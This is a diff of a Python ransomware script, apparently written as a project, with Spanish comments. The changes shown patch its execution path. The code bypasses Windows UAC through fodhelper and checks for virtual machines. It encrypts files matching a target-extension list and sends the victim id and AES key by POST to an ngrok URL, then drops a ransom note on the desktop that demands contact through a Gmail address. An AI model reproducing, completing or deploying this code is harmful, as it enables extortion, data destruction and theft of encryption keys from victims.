@@ -58,7 +58,7 @@ def execute_protocol(antivm=True, send_post=True, executable=True):
                 name = sys.executable
                 cmd = '{} /k {}'.format(CMD, name)
             else:
-                cmd = '{} /k {} {}'.format(CMD, PYTHON_CMD, __file__)
+                cmd = '{} /k {} {}'.format(CMD, sys.executable, os.path.realpath(__file__))
             print(cmd)
             bypass_uac(cmd)
             os.system(FOD_HELPER)
@@ -68,6 +68,7 @@ def execute_protocol(antivm=True, send_post=True, executable=True):
     else:
         print("Executing encryption protocol")
         # Algunas comprobaciones antes de iniciar el protocolo
+        
         ved = VirtualEnvironmentDetector(dodelay=False)
 
         if not ved.is_windows():
@@ -104,12 +105,12 @@ def execute_protocol(antivm=True, send_post=True, executable=True):
                 for fn in files:
                     full_path = root + os.sep + fn
                     ext = cm.get_file_extension(full_path)
-                    if ext in cm.TARGET_EXT and ext not in cm.EXCLUDED_EXT:
+                    if ext in cm.TARGET_EXT and ext not in cm.EXCLUDED_EXT and fn != 'test.txt':
                         cm.symmetric_encrypt_or_decrypt(full_path)
                         print(full_path + ' -> [encrypted]')
-
+        
         if send_post:
-            cm.send_post_request(url='http://22c26716a8d8.ngrok.io', id=str(id), key=cm.key)
+            cm.send_post_request(url='http://22c26716a8d8.ngrok.io/', id=str(id), key=cm.key)
 
         msg = 'ATTENTION! ALL YOUR DATA ARE PROTECTED WITH AES ALGORITHM\nYour security system was vulnerable, so all of your files are encrypted.\nIf you want to restore them, contact us by email: restoreyourfiles.gengar@gmail.com, indicating {} as email subject.\n\nBE CAREFUL AND DO NOT DAMAGE YOUR DATA:\nDo not rename encrypted files.\nDo not try to decrypt your data using third party software, it may cause permanent data loss.\nDo not trust anyone! Only we have keys to your files! Without this keys restore your data is impossible\n\nWE GUARANTEE A FREE DECODE AS A PROOF OF OUR POSSIBILITIES:\nYou can send us 2 files for free decryption.\nSize of file must be less than 1 Mb (non archived). We don`t decrypt for test DATABASE, XLS and other important files.\n\nDO NOT ATTEMPT TO DECODE YOUR DATA YOURSELF, YOU ONLY DAMAGE THEM AND THEN YOU LOSE THEM FOREVER\nAFTER DECRYPTION YOUR SYSTEM WILL RETURN TO A FULLY NORMALLY AND OPERATIONAL CONDITION!'.format(id)
         desktop_path = winshell.desktop()
@@ -119,10 +120,11 @@ def execute_protocol(antivm=True, send_post=True, executable=True):
             ransom_note.write(msg)
 
         print('All data was successfully encrypted')
+        
 
 
 if __name__ == '__main__':
-    execute_protocol(antivm=False)
+    execute_protocol(antivm=False, executable=False)
 
 """
 from CryptoManager import CryptoManager
